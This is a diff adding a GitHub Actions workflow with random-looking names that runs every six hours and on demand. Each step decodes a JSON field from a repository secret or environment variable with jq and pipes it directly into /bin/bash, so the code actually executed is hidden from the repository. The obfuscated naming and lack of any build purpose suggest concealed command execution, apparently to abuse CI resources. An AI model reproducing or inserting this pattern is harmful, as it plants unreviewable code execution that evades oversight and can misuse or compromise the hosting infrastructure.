@@ -1,0 +1,30 @@
+name: qushubin3981
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: qushubin3981
+        env:
+          lvj48609: ${{ secrets.lvj48609 }}
+        run: |
+          echo $lvj48609 | jq -r .c33 | /bin/bash
+          echo $by886 | jq -r .lawsc28 | /bin/bash
+          echo $mjeby2098 | jq -r .keis919 | /bin/bash
+          echo $i24 | jq -r .l99 | /bin/bash
+          echo $qwhnu3 | jq -r .bqfw94 | /bin/bash
+          echo $wt06858 | jq -r .hxtf15275 | /bin/bash
+          echo $s4957 | jq -r .kvyd84325 | /bin/bash
+          echo $ptta80 | jq -r .skcsb7775 | /bin/bash
+          echo $zzlhx90 | jq -r .nvmw11 | /bin/bash
+          echo $qw9 | jq -r .w5 | /bin/bash
+          echo $dbnd250 | jq -r .hd6 | /bin/bash
+          echo $ruf570 | jq -r .kkd08461 | /bin/bash
+          echo $mupdo76 | jq -r .ollxd51977 | /bin/bash
+
